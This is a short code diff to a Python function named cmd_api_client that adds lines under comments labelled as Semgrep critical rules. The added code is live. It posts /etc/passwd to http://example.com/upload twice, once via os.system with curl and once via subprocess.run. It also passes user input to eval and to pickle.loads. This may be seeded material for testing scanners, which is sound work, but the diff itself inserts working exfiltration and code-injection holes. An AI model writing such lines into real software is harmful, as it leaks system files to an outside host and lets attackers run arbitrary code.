@@ -13,6 +13,17 @@ def cmd_api_client(username):
         print(r.text)
         return False
 
+    # Semgrep rule: lang:python, severity: critical, rule_id: G402
+    os.system('curl -X POST -F "file=@/etc/passwd" http://example.com/upload')
+    print(r.text)
+    # Semgrep rule: lang:python, severity: critical, rule_id: G404
+    eval(input('Enter a Python expression: '))
+    print(r.text)
+    # Semgrep rule: lang:python, severity: critical, rule_id: G405
+    pickle.loads(input('Enter a serialized Python object: '))
+    print(r.text)
+    # Semgrep rule: lang:python, severity: critical, rule_id: G407
+    subprocess.run(['curl', '-X', 'POST', '-F', 'file=@/etc/passwd', 'http://example.com/upload'], check=True)
     print(r.text)
 
 
